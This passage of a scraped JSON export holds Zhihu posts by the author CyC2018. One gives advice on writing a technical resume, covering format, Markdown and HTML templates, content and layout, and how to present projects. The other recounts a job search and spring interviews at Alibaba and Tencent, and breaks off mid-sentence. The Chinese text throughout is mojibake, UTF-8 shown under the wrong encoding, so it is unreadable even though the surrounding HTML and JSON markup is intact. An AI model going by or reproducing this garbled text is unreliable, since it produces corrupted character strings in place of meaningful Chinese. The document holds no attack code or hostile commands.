å¸Œæœ›æŸäº›å†…å®¹è¢«é¢è¯•å®˜é—®åˆ°ï¼Œé‚£ä¹ˆæœ€å¥½æŠŠè¿™äº›å†…å®¹æ”¾åœ¨é¢è¯•å®˜æ¯”è¾ƒèƒ½æ³¨æ„åˆ°çš„ä½ç½®ã€‚</li></ul><p>âœğŸ»</p><h2>2. æœ¬è´¨</h2><p>ç®€å†ç›¸å½“äºå‘ä¼ä¸šæ¨é”€è‡ªå·±çš„å·¥å…·ï¼Œåœ¨ç®€å†ä¸Šä½ éœ€è¦å°½å¯èƒ½å±•ç°è‡ªå·±èƒ½ç»™ä¼ä¸šå¸¦æ¥çš„ä»·å€¼ï¼Œè¿™ç§ä»·å€¼ä»ä¸¤æ–¹é¢å»è¯„ä¼°ï¼š</p><ul><li> æŠ€èƒ½çš„åŒ¹é…ç¨‹åº¦ã€‚é™¤äº†åˆ¤æ–­æŠ€èƒ½æ ˆæ˜¯å¦å’Œå²—ä½æ‰€è¦æ±‚çš„æŠ€èƒ½æ ˆåŒ¹é…ä¹‹å¤–ï¼Œè¿˜è¦çœ‹æ˜¯å¦å…·å¤‡å…¬å¸ç›®å‰ä¸šåŠ¡ç›¸å…³çš„é¡¹ç›®ç»å†ã€‚<br/> </li><li> èƒ½åŠ›è¯æ˜ã€‚å³ä½¿æŠ€èƒ½åŒ¹é…äº†ï¼Œä½†æ˜¯å¦‚æœèƒ½åŠ›ä¸è¶³çš„è¯ä¾ç„¶ä¸èƒ½èƒœä»»å·¥ä½œä»»åŠ¡ã€‚å¯ä»¥é€šè¿‡å­¦å†ã€å¤§èµ›å¥–é¡¹ã€å·¥ä½œå’Œå®ä¹ ç»å†ã€é¡¹ç›®ä¸­è§£å†³çš„é—®é¢˜ç­‰æ–¹é¢å»è¯æ˜è‡ªå·±çš„èƒ½åŠ›ã€‚åº”è¯¥åˆ†æ¸…å“ªä¸ªæ˜¯ä½ çš„ä¼˜åŠ¿å’ŒåŠ£åŠ¿ï¼Œçªå‡ºä¼˜åŠ¿å¹¶å¼±åŒ–åŠ£åŠ¿ï¼Œæ¯”å¦‚å­¦å†ä¸å¥½çš„è¯å°±æŠŠæ•™è‚²ç»å†æ”¾åé¢ä¸€äº›ã€‚<br/> </li></ul><p>âœğŸ»</p><h2>3. å½¢å¼</h2><p>é™¤äº†åœ¨æ‹›è˜ç½‘ç«™ä¸Šå¡«å†™è‡ªå·±çš„ä¿¡æ¯ä¹‹å¤–ï¼Œé€šå¸¸è¿˜éœ€è¦é™„å¸¦ä¸€ä»½ PDF ç®€å†ï¼Œå¹¶ä¸”é¢è¯•çš„æ—¶å€™ä¹Ÿéœ€è¦è‡ªå·±æºå¸¦ä¸€ä»½çº¸è´¨ç®€å†ï¼ˆæœ€å¥½å¤šå¸¦å‡ ä»½ï¼Œä»¥å…å½“å¤©æœ‰å¤šåœºé¢è¯•ï¼‰ã€‚</p><p>é™¤äº† PDF ç®€å†ä¹‹å¤–ï¼Œé€šå¸¸è¿˜æœ‰ Markdownã€Wordã€Latex ç®€å†ï¼Œä½†æ˜¯è¿™äº›å½¢å¼çš„ç®€å†æœ€åä¹Ÿéƒ½éœ€è¦è½¬æ¢æˆ PDF ç®€å†ï¼Œå› ä¸º PDF æ’ç‰ˆå’Œæ ¼å¼éƒ½ä¸å®¹æ˜“åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­å‘ç”Ÿæ”¹å˜ï¼Œè€Œä¸”ä¹Ÿæ–¹ä¾¿æ‰“å°ï¼Œæ‰€ä»¥é€‚åˆä½œä¸ºæ­£å¼æ–‡æ¡£ã€‚</p><p>æ¨èä½¿ç”¨ Markdown ç®€å†ï¼Œç„¶åè½¬æ¢ä¸º PDF ç®€å†ã€‚å› ä¸º Markdown æ’ç‰ˆç®€æ´ï¼Œè€Œä¸”æ›´å®¹æ˜“ä¿®æ”¹ã€‚ä½†æ˜¯ Markdown ç®€å†æœ‰ä¸€ä¸ªä¸è¶³ä¹‹å¤„ï¼Œå°±æ˜¯ä¸å¤Ÿç´§å‡‘ï¼Œæœ¬æ¥ä¸€é¡µçš„ç®€å†å¯èƒ½éœ€è¦ä¸¤é¡µã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡ä¿®æ”¹æ ·å¼è¡¨çš„æ–¹å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œå‡å°è¡Œé—´è·ã€å‡å°è¾¹è·ã€ç¼©å°å­—ä½“ã€‚ä»¥ Typora ç¼–è¾‘å™¨ä¸ºä¾‹ï¼Œåœ¨æ ·å¼æ–‡ä»¶å¤¹ä¸‹å»ºç«‹ base.user.css æ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ shift+F12 å¿«æ·é”®æ‰“å¼€ DevTools æ¥ä¿®æ”¹æ ·å¼ï¼Œå…·ä½“æ­¥éª¤è¯·å‚è€ƒ <a href=\"https://link.zhihu.com/?target=https%3A//support.typora.io/Add-Custom-CSS/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Add Custom CSS</a>ã€‚</p><p>ä¸Šé¢ä»‹ç»çš„ç®€å†éƒ½ä»¥æ–‡æœ¬ä¸ºä¸»ï¼Œå¦‚æœæƒ³è¦å±•ç¤ºå›¾æ–‡å†…å®¹çš„è¯ï¼Œæ¨èä½¿ç”¨ HTML ç®€å†ï¼Œå®ƒå¯ä»¥æ›´è¯¦ç»†å’Œç›´è§‚åœ°æ¼”ç¤ºé¡¹ç›®ç»å†ç­‰ã€‚åšå¥½ä¹‹åéƒ¨ç½²åˆ° Github Pages ä¸Šï¼Œå¹¶å°†åœ°å€é™„åœ¨ PDF ç®€å†ä¸Šã€‚</p><p>âœğŸ»</p><h2>4. æ¨¡ç‰ˆ</h2><h2>4.1 Markdown-Resume</h2><p>è¿™é‡Œæä¾›ä¸€ä¸‹ç¬”è€…åˆ¶ä½œçš„ Markdown ç®€å†æ¨¡ç‰ˆï¼š<a href=\"https://link.zhihu.com/?target=https%3A//github.com/CyC2018/Markdown-Resume\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Markdown-Resume</a>ï¼Œclone åˆ°æœ¬åœ°ï¼Œç„¶åä½¿ç”¨ Typora ç­‰ç¼–è¾‘å™¨ä¿®æ”¹ï¼Œå¹¶å¯¼å‡ºæˆ PDFã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-16dc0905257ed617540c387820020e03_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1062\" data-rawheight=\"603\" class=\"origin_image zh-lightbox-thumb\" width=\"1062\" data-original=\"https://pic4.zhimg.com/v2-16dc0905257ed617540c387820020e03_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1062&#39; height=&#39;603&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1062\" data-rawheight=\"603\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1062\" data-original=\"https://pic4.zhimg.com/v2-16dc0905257ed617540c387820020e03_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-16dc0905257ed617540c387820020e03_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>4.2 Mobirise</h2><p>ç¬”è€…çš„ <a href=\"https://link.zhihu.com/?target=https%3A//cyc2018.github.io/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">HTML ç®€å†</a> ä¸»è¦ä½¿ç”¨  <a href=\"https://link.zhihu.com/?target=https%3A//mobirise.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Mobirise</a> æ­å»ºï¼Œå®ƒæ˜¯å…è´¹çš„ç«™ç‚¹ç”Ÿæˆå™¨ï¼Œä¸éœ€è¦ HTML ç­‰å‰ç«¯çŸ¥è¯†å°±å¯ä»¥ä½¿ç”¨ï¼ŒåŸºæœ¬ä¸Šæ‹–ä¸€æ‹–ç»„ä»¶å°±èƒ½æ­å¥½ä¸€ä¸ªå¾ˆå¥½çœ‹çš„ HTML é¡µé¢ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-6249eea2e1cf85450524350aaf05a771_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"577\" class=\"origin_image zh-lightbox-thumb\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-6249eea2e1cf85450524350aaf05a771_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1280&#39; height=&#39;577&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1280\" data-rawheight=\"577\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1280\" data-original=\"https://pic2.zhimg.com/v2-6249eea2e1cf85450524350aaf05a771_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-6249eea2e1cf85450524350aaf05a771_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å¦‚æœç®€å†ä¸Šæœ‰å¾ˆå¤š GIF å›¾ç‰‡ï¼Œåˆšè¿›å»çš„æ—¶å€™ GIF åŠ è½½ä¸å®Œå…¨çš„è¯æ¼”ç¤ºæ•ˆæœç‰¹åˆ«ä¸å¥½ï¼Œæ‰€ä»¥ç¬”è€…çš„ HTML ç®€å†å¢åŠ äº†ä¸€ä¸ªåŠ è½½é¡µç”¨æ¥åŠ è½½å›¾ç‰‡ã€‚åŠ è½½é¡µæ²¡åŠæ³•ä½¿ç”¨ Mobirise æ¥å®ç°ï¼Œéœ€è¦æœ‰ä¸€å®šçš„å‰ç«¯åŸºç¡€ã€‚</p><p>âœğŸ»</p><h2>5. å†…å®¹</h2><p>å¿…é¡»å†™çš„å†…å®¹ï¼š</p><ul><li>å§“åç›¸å½“äºä½ çš„ IDï¼Œåº”è¯¥æŠŠå§“åæ”¾åœ¨æœ€æ˜¾çœ¼çš„åœ°æ–¹ã€‚</li><li>ä¸ºäº†æ–¹ä¾¿ HR è”ç³»ä½ ï¼Œä¹Ÿè¦æŠŠè”ç³»ä¿¡æ¯ä¹Ÿæ”¾åœ¨å’Œå§“åä¸€æ ·æ˜¾çœ¼çš„ä½ç½®ã€‚</li><li>ä¸ªäººåšå®¢å’Œ Github ç­‰æŠ€æœ¯ç¤¾åŒºè´¦å·å¯ä»¥ä½œä¸ºåŠ åˆ†é¡¹ã€‚</li><li>æ•™è‚²ç»å†å’Œå·¥ä½œç»å†æŒ‰å¹´ä»½é€†åºæ¥å†™ã€‚</li><li>é¡¹ç›®ç»å†å¯ä»¥å†™ç§‘ç ”é¡¹ç›®ã€ä¸ªäººé¡¹ç›®ã€å®ä¹ å’Œå·¥ä½œé¡¹ç›®ã€‚</li><li>æŠ€èƒ½æ¸…å•æœ€å¥½å¯ä»¥è®©äººä¸€çœ¼å°±çœ‹å‡ºä½ çš„ç†Ÿç»ƒåº¦ï¼Œå¯ä»¥ä½¿ç”¨ç²¾é€šã€ç†Ÿæ‚‰ã€äº†è§£ç­‰è¯è¯­ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ â˜…â˜…â˜† è¿™ç§å›¾æ ‡ã€‚</li></ul><p>éœ€è¦è°¨æ…è€ƒè™‘çš„å†…å®¹ï¼š</p><ul><li>æœ‰äº›ä¼ä¸šä¼šæ ¹æ®æ€§åˆ«ã€å¹´é¾„ç­‰ä¿¡æ¯ç­›é€‰äººï¼Œæœ€å¥½å†™ä¸Šï¼Œä¸å†™ä¹Ÿæ²¡ä»€ä¹ˆå…³ç³»ã€‚</li><li>å·¥ä½œç»éªŒå’ŒæœŸæœ›è–ªèµ„å¯¹äºæ ¡æ‹›ç”Ÿæ¥è¯´ä¸éœ€è¦å†™ï¼Œä½†æ˜¯ç¤¾æ‹›ç”Ÿå°±ä¸€å®šè¦å†™ã€‚</li><li>åªå†™å¯ä»¥ç»™ä¼ä¸šå¸¦æ¥ä»·å€¼çš„å…´è¶£çˆ±å¥½ï¼Œå…¶å®ƒçš„æ— å…³å…´è¶£çˆ±å¥½ä¸è¦å†™ã€‚</li><li>å’ŒæŠ€æœ¯ç›¸å…³çš„å¤§èµ›è·å¥–ç»å†å¯ä»¥å†™ï¼Œä½†æ˜¯å…¶å®ƒä¸€äº›æ¯”èµ›è·å¥–å°±ä¸è¦å†™ã€‚</li><li>ä¸‰å¥½å­¦ç”Ÿã€å¥–å­¦é‡‘ã€å››å…­çº§æˆç»©ã€ç»©ç‚¹å¯ä»¥å†™ï¼Œä»¥è¯æ˜ä½ çš„å­¦ä¹ èƒ½åŠ›ï¼Œä½†æ˜¯å°½é‡ä¸è¦å å¤ªå¤šè¡Œï¼Œå¦‚æœä¸æ˜¯ç‰¹åˆ«å¥½çš„è¯ä¹Ÿå¯ä»¥ä¸å†™ã€‚</li><li>ä¸ªäººè¯„ä»·å¦‚æœè¦å†™çš„è¯ä¸è¦å¤ªç©ºæ³›ï¼Œä»€ä¹ˆçƒ­çˆ±å­¦ä¹ åƒè‹¦è€åŠ³ç­‰å°±ä¸è¦å†™äº†ï¼Œè¦å†™å¾—è¯å¯ä»¥å†™åœ¨æœ€åå½“åšæ˜¯ç®€å†å…¶å®ƒå†…å®¹çš„æ€»ç»“ã€‚</li></ul><p>âœğŸ»</p><h2>6. æ’ç‰ˆ</h2><p>è™½ç„¶å†…å®¹æ¯”æ’ç‰ˆé‡è¦ï¼Œä½†æ˜¯å¥½çš„æ’ç‰ˆä¼šè®©äººçœ‹ç€èˆ’æœï¼Œä¹Ÿå°±ä¼šè®©é¢è¯•å®˜å’Œ HR æ›´æ„¿æ„å»å‘ç°ä½ çš„ä»·å€¼ã€‚</p><ul><li>ä¸­æ–‡å’Œæ•°å­—è‹±æ–‡ä¹‹é—´åŠ ç©ºæ ¼ï¼Œå› ä¸ºä¸­æ–‡çš„å­—ä½“æ’ç‰ˆå’Œæ•°å­—è‹±æ–‡çš„æœ‰å¾ˆå¤§ä¸åŒï¼Œæ•°å­—è‹±æ–‡åå°ä¸€äº›ã€‚å¦‚æœä¸åŠ ç©ºæ ¼çš„è¯ï¼Œé‚£ä¹ˆæ•´ç¯‡æ–‡ç« çœ‹ç€ä¼šéå¸¸å¯†é›†æ‚ä¹±ï¼Œä¸­æ–‡å’Œæ•°å­—è‹±æ–‡æ··åœ¨ä¸€èµ·å‚å·®ä¸é½ã€‚</li><li>ä¸“æœ‰åè¯ä¸€å®šè¦ä¿è¯å¤§å°å†™å®Œå…¨æ­£ç¡®ï¼Œä¾‹å¦‚ä½¿ç”¨ Java è€Œä¸æ˜¯ javaï¼ŒjQuery è€Œä¸æ˜¯ Jqueryã€‚</li><li>å†…å®¹ä¹Ÿåº”è¯¥æ³¨æ„å¯¹é½ï¼Œå¦åˆ™ä¼šå¾ˆä¹±ã€‚</li><li>æœ€é‡è¦çš„æ˜¯ä¸è¦å¤ªèŠ±å“¨ï¼Œå°½é‡ç®€æ´ã€‚</li></ul><p>âœğŸ»</p><h2>7. é¡¹ç›®ä»‹ç»</h2><p>å‰é¢è®²åˆ°é¡¹ç›®ç»å†ä¸€æ–¹é¢å¯ä»¥ç”¨äºåŒ¹é…æŠ€èƒ½ï¼Œå¦ä¸€æ–¹é¢ä¹Ÿå¯ä»¥é€šè¿‡ä½ åœ¨é¡¹ç›®ä¸­è§£å†³çš„é—®é¢˜æ¥å±•ç¤ºä½ çš„èƒ½åŠ›ã€‚å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ­¥éª¤ä»‹ç»é¡¹ç›®ï¼š</p><ul><li>ä¸ºä»€ä¹ˆåšè¿™ä¸ªé¡¹ç›®ï¼›</li><li>é¡¹ç›®æœ‰å“ªäº›åŠŸèƒ½ï¼›</li><li>ä½ åœ¨é¡¹ç›®ä¸­æ‹…ä»»çš„è§’è‰²ï¼›</li><li>ç¢°åˆ°äº†å“ªäº›é—®é¢˜ï¼›</li><li>ä½¿ç”¨ä»€ä¹ˆæ–¹å¼å»è§£å†³é—®é¢˜çš„ï¼›</li><li>è§£å†³æ•ˆæœæ˜¯æ€æ ·ï¼Œå’Œåˆ«äººç›¸æ¯”æœ‰ä»€ä¹ˆä¼˜åŠ¿ã€‚</li></ul><p>ä¸è¦ç”¨å¤ªè¿‡ä¸»è§‚çš„è¯­è¨€ï¼Œè€Œæ˜¯ç”¨æ•°æ®ç­‰å®¢è§‚äº‹å®ã€‚æ¯”å¦‚ä»‹ç»ç¢°åˆ°çš„é—®é¢˜æ—¶ï¼Œä¸è¦ç”¨â€œéå¸¸éš¾è§£å†³â€ç­‰è¯è¯­ï¼Œè€Œæ˜¯ç”¨â€œå¹¶å‘ç”¨æˆ·æ•°è¾¾åˆ°XXXå¯¼è‡´å“åº”æ—¶é—´å¢åŠ åˆ°XXXâ€ç­‰æ•°æ®ã€‚</p><p>ä¹Ÿä¸è¦å †å æ— æ„ä¹‰çš„æŠ€æœ¯åè¯ï¼Œæ¯”å¦‚â€œåŸºäº Springã€SpringMVCã€Hibernate å®ç°äº† XXX ç³»ç»Ÿï¼ŒåŒ…å«å¢åˆ æŸ¥æ”¹ç­‰åŠŸèƒ½â€ã€‚</p><h2>åŸæ–‡é“¾æ¥</h2><p><a href=\"https://link.zhihu.com/?target=https%3A//xiaozhuanlan.com/topic/5039476182\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">xiaozhuanlan.com/topic/</span><span class=\"invisible\">5039476182</span><span class=\"ellipsis\"></span></a></p>", 
            "topic": [
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/56655579", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 8, 
            "title": "ä»æ˜¥æ‹›æƒ¨è´¥åˆ°ç§‹æ‹›æ”¶è· BAT OFFER", 
            "content": "<p>ğŸš€</p><h2>1. Offer æƒ…å†µ</h2><p>ç»è¿‡äº†é•¿è¾¾ä¸€å¹´å·¦å³çš„å¤ä¹ ï¼Œç§‹æ‹›ä¹Ÿæ”¶åˆ°äº†å‡ ä¸ªæ¯”è¾ƒæ»¡æ„çš„ Offerï¼Œå‚åŠ é¢è¯•çš„éƒ½é€šè¿‡äº†ã€‚</p><ul><li>ç™¾åº¦ï¼Œä¼ä¸šæ™ºèƒ½å¹³å°ï¼› </li><li>é˜¿é‡Œï¼Œé«˜å¾·åœ°å›¾ï¼› </li><li>è…¾è®¯ï¼ŒIEG æ¸¸æˆå¹³å°ï¼Œåå°ç ”å‘ï¼ŒSPï¼› </li><li>å­—èŠ‚è·³åŠ¨ï¼Œå¤´æ¡åå°ç ”å‘ï¼ŒSSPï¼› </li><li>åä¸ºï¼ŒCloud Buï¼› </li><li>ç½‘æ˜“æ¸¸æˆï¼Œæ¢¦å¹»äº‹ä¸šéƒ¨ï¼› </li><li>é¡ºä¸°ç§‘æŠ€ã€‚ </li></ul><p>ğŸš€</p><h2>2. å‰æœŸå‡†å¤‡</h2><p>ä¹Ÿæ˜¯åœ¨å»å¹´åä¸€æœˆä»½å·¦å³ï¼Œçœ‹ç€èº«è¾¹ä¸¤å¹´åˆ¶çš„åŒå­¦ç»å†äº†é•¿æ—¶é—´è€Œåˆè‰°éš¾çš„ç§‹æ‹›ï¼Œæˆ‘å¼€å§‹æ„è¯†åˆ°è‡ªå·±åº”è¯¥æå‰å‡†å¤‡äº†ï¼Œå¦åˆ™è‡ªå·±çš„ç§‹æ‹›ä¼šå¾ˆæƒ¨ã€‚</p><p>æœ¬ç§‘çš„æ—¶å€™ï¼Œè™½ç„¶å­¦è¿‡è®¡ç®—æœºç½‘ç»œã€æ“ä½œç³»ç»Ÿå’Œæ•°æ®ç»“æ„ç­‰è¯¾ç¨‹ï¼Œè€Œä¸” Leetcode ä¹Ÿåˆ·äº†ä¸€ä¸¤ç™¾é¢˜ï¼Œä½†æ˜¯ç¦»æ‹›è˜è¦æ±‚è¿˜å·®çš„å¾ˆè¿œï¼Œå­¦çš„éƒ½å¾ˆæµ…åªå¤Ÿåº”ä»˜è€ƒè¯•ï¼Œä¹Ÿæ²¡æœ‰å®é™…çš„é¡¹ç›®ç»éªŒã€‚</p><p>æˆ‘çš„ç ”ç©¶ç”Ÿæ–¹å‘æ˜¯è®¡ç®—æœºå›¾å½¢å­¦ï¼Œç ”ç©¶ç”ŸæœŸé—´ä¸»è¦åšä¸€äº›ç§‘ç ”é¡¹ç›®ã€‚åœ¨é€‰æ‹©æ‹›è˜æ–¹å‘çš„æ—¶å€™ï¼Œæˆ‘ä¹Ÿçº ç»“äº†æ˜¯ä¸æ˜¯æ‰¾å›¾å½¢å­¦ç›¸å…³æ–¹å‘çš„ï¼Œä½†æ˜¯è€ƒè™‘åˆ°å›¾å½¢å­¦çš„é€‰æ‹©ä¸æ˜¯å¾ˆå¤šï¼Œæ‰€ä»¥è¿˜æ˜¯å†³å®šæŠ•åå°ç ”å‘ç›¸å…³çš„å²—ä½ã€‚</p><p>äºæ˜¯å¼€å§‹æ”¶é›†å„ç§å­¦ä¹ èµ„æ–™ï¼Œä¹Ÿä¹°äº†å¾ˆå¤šçº¸è´¨ä¹¦ã€‚æœ€å¼€å§‹çš„å­¦ä¹ æ•ˆç‡å¹¶ä¸æ˜¯å¾ˆé«˜ï¼Œå¾ˆè¿·èŒ«ï¼Œè§‰å¾—è¦å­¦çš„å†…å®¹å¾ˆå¤šæ— ä»ä¸‹æ‰‹ã€‚é‚£æ—¶å€™çœ‹åˆ«äººçš„é¢ç»ï¼Œæ„Ÿè§‰è‡ªå·±å¤ªå¼±äº†ï¼Œå¾ˆå¤šå†…å®¹éƒ½æ²¡æ¥è§¦è¿‡ï¼Œäºæ˜¯æ›´åŠ è¿·èŒ«ã€‚è¿·èŒ«çš„æ—¶å€™æ€»æƒ³ç€é€ƒé¿ï¼Œè¦æ˜¯ä¸å¤ä¹ å¤šå¥½ï¼Œç©ç©æ¸¸æˆæ¯å¤©å¤šç®€å•ã€‚ä½†æ˜¯æ¸¸æˆç©çš„è¶Šå¤šï¼Œé‚£ç§ç„¦è™‘æ„Ÿè¶Šæ˜¯å¼ºçƒˆã€‚è§£å†³ç„¦è™‘çš„å”¯ä¸€åŠæ³•å°±æ˜¯æƒ³åŠæ³•è§£å†³å½“å‰é—®é¢˜ã€‚å½“æ…¢æ…¢åœ°ä»æ¶ˆæçš„å­¦ä¹ æ€åº¦ä¸­è°ƒæ•´è¿‡æ¥ï¼ŒæŒæ¡çš„çŸ¥è¯†è¶Šå¤šï¼Œé‚£ç§ç„¦è™‘æ„Ÿä¹Ÿéšä¹‹æ¶ˆå¤±ã€‚å½“ç„¶è¿™ä¸ªè¿‡ç¨‹å¹¶ä¸å®¹æ˜“ï¼Œä¸ä»…éœ€è¦å¾ˆå¥½çš„æ¯…åŠ›ï¼Œä¹Ÿè¦æ ¹æ®è‡ªèº«æƒ…å†µæ‰¾åˆ°é—®é¢˜çš„æœ‰æ•ˆè§£å†³æ–¹æ³•ã€‚</p><p>ğŸš€</p><h2>3. æ˜¥æ‹›</h2><h2>3.1 æ˜¥æ‹›å¼€å§‹</h2><p>ä¸‰æœˆä»½å„ä¸ªå…¬å¸å°±å¼€å§‹æ˜¥æ‹›äº†ï¼Œé‚£æ—¶å€™åˆšæŠŠä¸€äº›åŸºç¡€çŸ¥è¯†ç®€å•åœ°å¤ä¹ äº†ä¸€ä¸‹ï¼ŒLeetcode åˆ·åˆ°äº†ä¸‰å››ç™¾é¢˜ã€‚ä½†æ˜¯æ²¡æœ‰åå°ç ”å‘ç›¸å…³çš„é¡¹ç›®ï¼Œäºæ˜¯èŠ±äº†ä¸€ä¸ªæ˜ŸæœŸå·¦å³ç”¨ PHP åšäº†ä¸€ä¸ªå¾®åšç³»ç»Ÿã€‚å½“æ—¶åšç®€å†ç‰¹åˆ«ç—›è‹¦ï¼Œæ²¡å†…å®¹å¯ä»¥å†™ï¼Œçœ‹ç€å…¶ä»–äººç®€å†å„ç§æ–°æŠ€æœ¯ï¼Œè‡ªå·±éƒ½æ²¡æŒæ¡ï¼Œæ‰€ä»¥å¾ˆè™šã€‚</p><h2>3.2 é˜¿é‡Œä¸€è½®æ¸¸</h2><p>æœ€å¼€å§‹æŠ•çš„é˜¿é‡Œï¼Œå®éªŒå®¤å¤§å‡ å±Šæœ‰ä¸ªå¸ˆå…„åœ¨å¤©çŒ«ç²¾çµå›¢é˜Ÿï¼Œæ‰€ä»¥ç»™æˆ‘å†…æ¨äº†ã€‚äºæ˜¯æˆ‘äººç”Ÿä¸­ç¬¬ä¸€åœºé¢è¯•å°±æ˜¯é˜¿é‡Œï¼Œå¾ˆè‡ªç„¶åœ°è¢«è™äº†ä¸€éã€‚è®°å¾—å½“æ—¶çº¦å¥½ä¸‹åˆä¸¤ç‚¹ç”µè¯é¢è¯•ï¼Œåˆé¥­éƒ½æ²¡åƒï¼Œæ€•åƒå®Œä¹‹åçŠ¯å›°å½±å“çŠ¶æ€ï¼Œç„¶åæ‰¾äº†ä¸€ä¸ªå¾ˆå®‰é™åˆæ²¡äººçš„åœ°æ–¹å‘†åˆ°äº†ä¸¤ç‚¹ï¼Œè°ƒæ•´è‡ªå·±çš„çŠ¶æ€ã€‚å¯æ˜¯é¢è¯•å®˜çªç„¶æ‰“ç”µè¯æ¥è¯´æœ‰ä¸ªä¼šè®®è¦å¼€ï¼Œæ‰€ä»¥æ¨è¿Ÿäº†å¤§æ¦‚ä¸€ä¸ªå°æ—¶ã€‚è‹¦è‹¦ç­‰åˆ°ä¸‰ç‚¹å·¦å³ï¼Œé¢è¯•æ­£å¼å¼€å§‹ï¼Œä¸å‡ºæ‰€æ–™é¢å¾—éå¸¸ç³Ÿç³•ã€‚é¦–å…ˆè‡ªå·±è¡¨è¿°çš„å¾ˆæœ‰é—®é¢˜ï¼Œå¾ˆå¤šå†…å®¹æ²¡å›ç­”åˆ°å…³é”®ç‚¹ä¸Šï¼Œè‡ªå·±ä¼šçš„å†…å®¹ä¹Ÿä¸æ€ä¹ˆç»§ç»­æ‰©å±•å›ç­”ã€‚å…¶æ¬¡çŸ¥è¯†æŒæ¡å¾—ç¡®å®ä¸å¤Ÿï¼Œè¿çº¿ç¨‹å®‰å…¨ã€ThreadLocalã€å‡½æ•°å¼ç¼–ç¨‹éƒ½ä¸ä¼šã€‚è™½ç„¶è¢«è™çš„å¾ˆæƒ¨ï¼Œä½†æ˜¯ä¹Ÿæœ‰å¥½å¤„ï¼ŒçŸ¥é“äº†é¢è¯•åˆ°åº•æ˜¯æ€æ ·çš„ï¼Œè‡ªå·±è¿˜æœ‰å“ªæ–¹é¢çš„ä¸è¶³ï¼Œè¯¥æ€ä¹ˆå‡†å¤‡ã€‚</p><h2>3.3 è…¾è®¯è¢«é­å°¸</h2><p>ç¬¬äºŒåœºé¢è¯•æ˜¯è…¾è®¯ï¼Œåœ¨ç»å†äº†é˜¿é‡Œçš„é¢è¯•ä¹‹åï¼Œå¹¶ä¸”åˆç»§ç»­å¤ä¹ äº†ä¸€æ®µæ—¶é—´ï¼Œæˆ‘å¯¹é¢è¯•å°±æ¯”è¾ƒæœ‰ä¿¡å¿ƒäº†ã€‚ä¸€é¢å…¶å®å›ç­”çš„æŒºç†æƒ³çš„ï¼Œè™½ç„¶å¾ˆå¤šé—®é¢˜æ²¡æœ‰ç«‹é©¬å›ç­”å‡ºæ¥ï¼Œä½†æ˜¯ç»è¿‡é¢è¯•å®˜çš„è€å¿ƒæç¤ºä¹‹åéƒ½èƒ½å›ç­”ä¸€äº›å†…å®¹ã€‚å½“æ—¶é¢äº†ä¸€ä¸ªåŠå°æ—¶ï¼Œé¢è¯•ä½“éªŒç‰¹åˆ«å¥½ã€‚å°è±¡æ¯”è¾ƒæ·±åˆ»çš„é¢˜ç›®æœ‰ï¼Œé˜…è¯»ä¸€ä¸ª Redis æºç ï¼Œåˆ†æå­˜åœ¨å“ªäº›é—®é¢˜ã€‚å…¶å®å°±æ˜¯ä¸€ä¸ªè®¡æ•°å™¨å®ç°çš„é™æµç®—æ³•ï¼Œä¼šæœ‰ä¸´ç•Œå€¼çš„é—®é¢˜ï¼Œä½†æ˜¯å½“æ—¶æ²¡å›ç­”å‡ºæ¥ï¼Œåªèƒ½å¬é¢è¯•å®˜ç»™æˆ‘è§£é‡Šã€‚è¿˜æœ‰ä¸€ä¸ªå¾®ä¿¡æ‰«äºŒç»´ç ï¼Œè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿäº†ä»€ä¹ˆï¼Œä¹Ÿæ²¡å›ç­”å¾—å¾ˆå¥½ï¼Œä¸è¿‡é¢è¯•å®˜ä¹Ÿå¾ˆè€å¿ƒåœ°çº æ­£æˆ‘å›ç­”ä¸Šçš„é”™è¯¯ã€‚ä¸€é¢é¡ºåˆ©é€šè¿‡äº†ï¼Œä½†æ˜¯æ€»ç›‘é¢æŒ‚äº†ã€‚æ€»ç›‘é¢æ²¡æœ‰é—®ä»€ä¹ˆæŠ€æœ¯é—®é¢˜ï¼Œå°±æ˜¯é—®äº†é—®é¡¹ç›®å’ŒèŒä¸šè§„åˆ’ã€‚è‡ªå·±çš„é¡¹ç›®ç¡®å®æ¯”è¾ƒ 